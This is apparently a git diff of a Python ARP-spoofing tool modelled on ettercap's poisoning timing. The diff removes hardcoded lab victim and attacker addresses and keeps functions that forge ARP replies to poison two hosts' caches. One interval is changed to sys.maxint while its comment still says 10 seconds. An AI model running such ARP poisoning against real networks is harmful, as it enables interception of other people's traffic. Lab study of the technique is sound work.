@@ -3,27 +3,14 @@ import spoofing_tool as spoof
 import time
 import sys
 
-# Hardcoded for now
 # https://prod.liveshare.vsengsaas.visualstudio.com/join?EE5AD55B6EBF068194A2BCB375C1A307EF78https://prod.liveshare.vsengsaas.visualstudio.com/join?EE5AD55B6EBF068194A2BCB375C1A307EF78
 
-# target one details
-g_macT1 = "08:00:27:b7:c4:af"
-g_ipT1 = "192.168.56.101"
-
-# target two details
-g_macT2 = "08:00:27:cc:08:6f"
-g_ipT2 = "192.168.56.102"
-
-# attacker details
-g_macAtk = "08:00:27:d0:25:4b"            
-g_ipAtk = "192.168.56.103"
-
 start_count = 5 # ettercap starts poisoning with 5 packets
-middle_count = 200
+middle_count = 200 # ettercap keeps poisoning for 200 packets
 end_count = 3 # ettercap ends poisoning with 3 packets
 
 start_interval = 1 # ettercap sends packets every second
-middle_interval = 10 # ettercap sends packets every  10 seconds
+middle_interval = sys.maxint # ettercap sends packets every 10 seconds
 end_interval = 1 # ettercap sends packets every second
 
 ONE_WAY_TOKEN = "ONE_WAY_TOKEN_abfjdfsldf"
@@ -49,7 +36,7 @@ def one_way_arp(macT1, ipT1, ipT2, macAtk, ipAtk, iface, pkt_type):
 def poison_m_times_every_n_secs(m, n, last_sent_time, should_poison, macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type):
     while m > 0:
         if time.time() - last_sent_time > n:
-            spoof.printf(m)
+            spoof.printf(m, 4)
             if should_poison:
                 arp_poison(macT1, ipT1, macT2, ipT2, macAtk, ipAtk, iface, pkt_type)
             else:
@@ -98,7 +85,3 @@ def build_packet(macAttacker, ipToSpoof, macVictim, ipVictim, pkt_type):
     packet[ARP].pdst  = ipVictim
     packet[ARP].op = pkt_type # 1 = request, 2 = reply
     return packet
-
-# call main
-if __name__=="__main__":
-    arp_spoofing(g_macT1, g_ipT1, g_macT2, g_ipT2, g_macAtk, g_ipAtk, "enp0s3")
